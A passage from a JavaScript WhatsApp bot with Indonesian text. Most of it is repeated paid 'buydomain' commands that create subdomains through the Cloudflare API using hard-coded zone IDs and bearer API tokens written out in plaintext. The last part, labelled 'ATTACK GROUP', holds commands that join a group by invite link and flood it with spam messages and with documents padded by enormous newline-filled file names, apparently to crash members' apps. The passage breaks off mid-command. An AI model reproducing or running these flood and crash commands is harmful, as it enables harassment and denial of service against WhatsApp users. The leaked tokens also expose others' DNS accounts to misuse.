           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 5000, db_saldo)
           break
          case 'buydomain3': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 10000, db_saldo)
            break
          case 'buydomain4': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 3000, db_saldo)
           break
          case 'buydomain5': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "UiM1CzcdcAYE_0wK1cv6nknLhR83lLywzzGQ5Q3r";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 3000, db_saldo)
           break
          case 'buydomain6': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 10000, db_saldo)
           break
          case 'buydomain7': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 2000, db_saldo)
           break
          case 'buydomain8': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 2000, db_saldo)
           break
          case 'buydomain9': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 2000, db_saldo)
           break    
case 'buydomain10': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e9fa18b714b6ee8987cad8e26fb30d64";
               let apitoken = "fXnytgaVk-_2NASioBjIhLFTib1kX19OAPi9h-KJ";
               let tld = "storehost.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 4000, db_saldo)
           break
          case 'buydomain11': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb040b2fa1975c2daf0df485c9b27f72";
               let apitoken = "fXnytgaVk-hJJnY6hYcu2yzDcl6LXDdM6wzhqJOzHTHTW4LsJa";
               let tld = "privateyour.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 8000, db_saldo)
           break
          case 'buydomain12': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "082d880e4df98024ef1b01ba5e6ac6f0";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "rafatharoffcial-private.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 12000, db_saldo)
           break
     case 'delgc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini Tuan✅`)
break
case 'addgc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini Tuan✅`)
           break      
// LAST DI ATAS
// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "Hardz Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "Hardz Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE Hardz`", fileName: `Hardz ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
